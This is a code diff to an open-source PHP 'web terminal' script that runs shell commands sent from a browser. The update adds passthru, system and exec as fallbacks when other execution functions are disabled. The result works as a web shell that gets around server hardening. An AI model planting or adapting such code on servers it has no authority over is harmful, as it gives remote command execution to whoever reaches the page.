@@ -2,7 +2,7 @@
 /**
  * PHP Web Terminal
  *
- * @version 1.2.2
+ * @version 1.2.3
  * @pv.pat [Original Author] - Updated by @pinoyvendetta
  * @link https://github.com/pinoyvendetta/php-web-terminal
  *
@@ -21,7 +21,7 @@ set_time_limit(0); // Allow script to run indefinitely for long tasks
 ob_implicit_flush(); // Ensure output is sent immediately
 
 // --- Version Information ---
-$version = '1.2.2';
+$version = '1.2.3';
 
 // --- System Detection ---
 $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
@@ -44,6 +44,8 @@ function execute_command($command, $cwd) {
         : 'cd ' . escapeshellarg($cwd) . ' && ' . $command . ' 2>&1';
 
     $output = '';
+
+    // Chain of command execution fallbacks for maximum compatibility
     if (is_function_enabled('shell_exec')) {
         $output = shell_exec($full_command);
     } elseif (is_function_enabled('proc_open')) {
@@ -61,8 +63,21 @@ function execute_command($command, $cwd) {
             $output .= stream_get_contents($pipes[2]); fclose($pipes[2]);
             proc_close($process);
         } else { $output = "Error: proc_open failed."; }
+    } elseif (is_function_enabled('passthru')) {
+        ob_start();
+        passthru($full_command, $return_var);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } elseif (is_function_enabled('system')) {
+        ob_start();
+        system($full_command, $return_var);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } elseif (is_function_enabled('exec')) {
+        exec($full_command, $output_array, $return_var);
+        $output = implode("\n", $output_array);
     } else {
-        $output = "Error: All preferred command execution functions are disabled.";
+        $output = "Error: All suitable command execution functions are disabled.";
     }
     return htmlspecialchars($output ?: "Command executed, but produced no output.", ENT_QUOTES, 'UTF-8');
 }
